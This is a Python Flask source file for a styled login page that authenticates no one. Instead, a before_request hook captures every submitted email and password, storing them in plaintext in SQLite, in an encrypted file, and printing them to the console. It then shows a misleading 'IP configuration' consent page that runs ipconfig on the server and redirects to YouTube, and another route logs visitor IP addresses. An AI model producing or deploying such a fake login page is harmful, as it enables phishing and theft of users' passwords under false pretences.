from flask import Flask, request, render_template_string, redirect, url_for
from datetime import datetime
import sqlite3
from cryptography.fernet import Fernet
import os
import re
import subprocess  # Ensure subprocess is imported

app = Flask(__name__, static_folder='static')  # Explicitly set the static folder

# HTML template for the login page
login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: url('/static/images/photo1.webp') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login {
            background: rgba(255, 255, 255, 0.8); /* Semi-transparent white */
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .login h1 {
            font-size: 2rem;
            color: #333333;
            margin-bottom: 1.5rem;
        }
        .input-field {
            margin-bottom: 1rem;
            text-align: left;
        }
        .input-field label {
            font-size: 0.9rem;
            color: #555555;
            margin-bottom: 0.5rem;
            display: block;
        }
        .input-field input {
            width: 100%;
            padding: 0.8rem;
            font-size: 1rem;
            border: 1px solid #cccccc;
            border-radius: 5px;
            outline: none;
            transition: border-color 0.3s ease;
        }
        .input-field input:focus {
            border-color: #2575fc;
        }
        .login-btn {
            width: 100%;
            padding: 0.8rem;
            font-size: 1rem;
            color: #ffffff;
            background: linear-gradient(135deg, #6a11cb, #2575fc);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .login-btn:hover {
            background: linear-gradient(135deg, #2575fc, #6a11cb);
        }
        .additional-links {
            margin-top: 1rem;
        }
        .additional-links a {
            font-size: 0.9rem;
            color: #2575fc;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .additional-links a:hover {
            color: #6a11cb;
        }
        .error-message {
            color: red;
            font-size: 0.9rem;
            margin-top: 0.5rem;
        }
    </style>
</head>
<body>
    <div class="login">
        <h1>Login</h1>
        <form action="/login" method="POST">
            <div class="input-field">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
                {% if email_error %}
                <p class="error-message">{{ email_error }}</p>
                {% endif %}
            </div>
            <div class="input-field">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
                {% if password_error %}
                <p class="error-message">{{ password_error }}</p>
                {% endif %}
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <div class="additional-links">
            <a href="#">Forgot Password?</a> | <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    email_error = request.args.get('email_error', '')
    password_error = request.args.get('password_error', '')
    return render_template_string(login_html, email_error=email_error, password_error=password_error)

@app.route('/dashboard')
def dashboard():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Dashboard</title>
        <style>
            body {
                font-family: 'Arial', sans-serif;
                background: url('/static/images/photo2.avif') no-repeat center center fixed;
                background-size: cover;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                text-align: center;
                background-color: #ffffff;
                padding: 2rem;
                border-radius: 8px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            h1 {
                color: #333333;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Welcome to the Dashboard!</h1>
            <p>You have successfully logged in.</p>
        </div>
    </body>
    </html>
    """

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email').lower()  # Convert email to lowercase
    password = request.form.get('password')

    email_error = None
    password_error = None

    # Validate email: must start with a letter and be lowercase
    if not re.match(r'^[a-z][a-z0-9._%+-]*@[a-z0-9.-]+\.[a-z]{2,}$', email):
        email_error = "Email must start with a letter and be lowercase."

    # Validate password: must be more than 6 characters, contain letters and special characters
    if len(password) <= 6:
        password_error = "Password must be more than 6 characters."
    elif not re.search(r'[a-zA-Z]', password):
        password_error = "Password must contain letters."
    elif not re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):
        password_error = "Password must contain a special character."

    # If there are validation errors, redirect back with error messages
    if email_error or password_error:
        return redirect(url_for('index', email_error=email_error, password_error=password_error))

    if not email or not password:
        return redirect(url_for('index', email_error=None, password_error="Email and password are required."))

    # Redirect to the warning page instead of the dashboard
    return redirect(url_for('confirm_youtube'))

KEY_FILE = 'encryption.key'
DATA_FILE = 'encrypted_data.txt'

def load_or_generate_key():
    if not os.path.exists(KEY_FILE):
        # Generate a new Fernet key
        key = Fernet.generate_key()
        with open(KEY_FILE, 'wb') as key_file:
            key_file.write(key)
    else:
        with open(KEY_FILE, 'rb') as key_file:
            key = key_file.read()
        # Validate the key format
        try:
            Fernet(key)  # Try initializing Fernet with the key
        except ValueError:
            print("Invalid key found. Regenerating a new key.")
            key = Fernet.generate_key()
            with open(KEY_FILE, 'wb') as key_file:
                key_file.write(key)
    return key

encryption_key = load_or_generate_key()
cipher = Fernet(encryption_key)

def save_encrypted_data(data):
    encrypted_data = cipher.encrypt(data.encode())
    with open(DATA_FILE, 'ab') as file:
        file.write(encrypted_data + b'\n')

@app.route('/confirm_youtube', methods=['GET', 'POST'])
def confirm_youtube():
    if request.method == 'GET':
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Warning</title>
            <style>
                body {
                    font-family: 'Roboto', sans-serif;
                    background: url('/static/images/photo3.avif') no-repeat center center fixed;
                    background-size: cover;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background: #ffffff;
                    padding: 2rem;
                    border-radius: 10px;
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                    text-align: center;
                    width: 100%;
                    max-width: 500px;
                }
                h1 {
                    font-size: 2rem;
                    color: #ff4b2b;
                    margin-bottom: 1rem;
                }
                p {
                    color: #555555;
                    margin-bottom: 1rem;
                }
                ul {
                    text-align: left;
                    margin: 1rem auto;
                    padding: 0 1rem;
                    color: #555555;
                }
                button {
                    padding: 0.8rem 1.5rem;
                    font-size: 1rem;
                    color: #ffffff;
                    background: linear-gradient(135deg, #ff416c, #ff4b2b);
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    margin: 0.5rem;
                    transition: background 0.3s ease;
                }
                button:hover {
                    background: linear-gradient(135deg, #ff4b2b, #ff416c);
                }
                .checkbox-container {
                    margin-top: 1rem;
                    color: #555555;
                }
                .checkbox-container input {
                    margin-right: 0.5rem;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Warning</h1>
                <p>Sharing your IP configuration can expose sensitive information, such as:</p>
                <ul>
                    <li>Your network details, including IP addresses and DNS servers.</li>
                    <li>Potential vulnerabilities in your network setup.</li>
                    <li>Information that could be used for unauthorized access or attacks.</li>
                </ul>
                <p>If you agree, the following will happen:</p>
                <ul>
                    <li>Your IP configuration will be displayed in the terminal.</li>
                    <li>You will be redirected to YouTube.</li>
                </ul>
                <form action="/confirm_youtube" method="POST">
                    <div class="checkbox-container">
                        <input type="checkbox" id="agree" name="agree" required>
                        <label for="agree">I understand the risks and agree to proceed.</label>
                    </div>
                    <button type="submit">I Agree</button>
                </form>
                <form action="/" method="GET">
                    <button type="submit">Cancel</button>
                </form>
            </div>
        </body>
        </html>
        """
    elif request.method == 'POST':
        print("POST request received for /confirm_youtube")  # Debug statement
        # Collect the user's IP address
        user_ip = request.remote_addr
        submission_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Run the ipconfig command and capture its output
        ipconfig_output = subprocess.check_output("ipconfig /all", shell=True, text=True)

        # Print the IP configuration to the terminal
        print("User's IP Configuration:")
        print(ipconfig_output)

        # Redirect to YouTube
        return redirect("https://www.youtube.com")

@app.route('/collect_ip', methods=['GET', 'POST'])
def collect_ip():
    if request.method == 'GET':
        # Render a page asking for permission to collect the IP address
        return """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Permission to Collect IP</title>
            <style>
                body {
                    font-family: 'Arial', sans-serif;
                    background: url('/static/images/photo4.avif') no-repeat center center fixed;
                    background-size: cover;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                .container {
                    text-align: center;
                    background-color: #ffffff;
                    padding: 2rem;
                    border-radius: 8px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }
                button {
                    padding: 0.8rem 1.5rem;
                    font-size: 1rem;
                    color: #ffffff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    margin-top: 1rem;
                }
                button:hover {
                    background-color: #0056b3;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Permission Required</h1>
                <p>We would like to collect your IP address for security purposes. Do you agree?</p>
                <form method="POST">
                    <button type="submit">I Agree</button>
                </form>
            </div>
        </body>
        </html>
        """
    elif request.method == 'POST':
        # Collect the user's IP address
        user_ip = request.remote_addr
        submission_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Save the IP address to the database
        conn = sqlite3.connect('login_data.db')
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ip_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                submission_time TEXT,
                ip_address TEXT
            )
        ''')
        cursor.execute('''
            INSERT INTO ip_logs (submission_time, ip_address)
            VALUES (?, ?)
        ''', (submission_time, user_ip))
        conn.commit()
        conn.close()

        return f"Thank you! Your IP address ({user_ip}) has been recorded."

def init_db():
    conn = sqlite3.connect('login_data.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            submission_time TEXT,
            email TEXT,
            password TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.before_request
def log_request_info():
    if request.endpoint == 'login' and request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        submission_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Prepare data for saving
        data_to_save = f"Submission Time: {submission_time}\nEmail: {email}\nPassword: {password}\n"

        # Save encrypted data to file
        save_encrypted_data(data_to_save)

        # Save data to the database
        conn = sqlite3.connect('login_data.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO login_logs (submission_time, email, password)
            VALUES (?, ?, ?)
        ''', (submission_time, email, password))
        conn.commit()
        conn.close()

        # Optionally, print the data to the console for debugging
        print(f"Submission Time: {submission_time}")
        print(f"Email: {email}")
        print(f"Password: {password}")

if __name__ == '__main__':
    init_db()
    app.run(debug=True)